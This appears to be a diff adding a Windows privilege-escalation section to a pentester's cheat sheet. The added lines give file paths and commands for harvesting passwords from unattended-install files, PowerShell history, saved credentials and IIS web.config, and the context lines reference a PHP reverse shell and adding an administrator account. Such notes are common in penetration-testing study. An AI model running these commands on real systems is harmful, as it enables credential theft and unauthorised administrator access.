@@ -516,3 +516,31 @@ https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-rev
 ## Add users on a windows system:
     net user <username> <password> /add
     net localgroup administrators <username> /add
+
+# Priviledge escalation Windows
+## Password harvesting
+### Unattended Windows Installations
+Installation done on many machine at the same time without the user. This can leave some config files with the passwd ect..: <br>
+- C:\Unattend.xml <br>
+- C:\Windows\Panther\Unattend.xml <br>
+- C:\Windows\Panther\Unattend\Unattend.xml <br>
+- C:\Windows\system32\sysprep.inf <br>
+- C:\Windows\system32\sysprep\sysprep.xml <br>
+
+### Powershell history 
+    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  (cmd.exe)
+    type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt (powershell)
+    
+### Saved Windows Credentials
+#### List saved creds:
+    cmdkey /list
+#### Use the saved creds of the admin user to run the console:
+    runas /savecred /user:admin cmd.exe
+
+### IIS Configuration
+Default web server. <br>
+Look for database passwd or user passwd in web.config: <br>
+- C:\inetpub\wwwroot\web.config <br>
+- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config <br>
+
+        type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
